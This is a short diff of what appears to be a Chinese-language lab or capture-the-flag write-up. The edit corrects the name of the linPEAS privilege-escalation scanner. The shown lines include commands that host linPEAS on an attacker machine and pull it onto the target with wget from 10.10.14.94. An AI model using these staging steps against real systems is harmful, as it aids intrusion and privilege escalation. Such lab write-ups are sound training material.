@@ -68,7 +68,7 @@ ssh登入失敗 在`/home`目錄找到一個叫 `larissa` 用他的名字當user
 想使用`sudo -l` 看看有沒有甚麼能提權的方法 但沒有
 ![image](https://hackmd.io/_uploads/rkDnrz4OC.png)
 
-用[`leanpeas`](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)來掃描 用法 先`wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64` 裝到本地
+用[`linpeas`](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)來掃描 用法 先`wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64` 裝到本地
 
 本地架一個`python3 -m http.server 9999` 
 然後在目標靶機把她載下來`wget http://10.10.14.94:9999/linpeas.sh` 
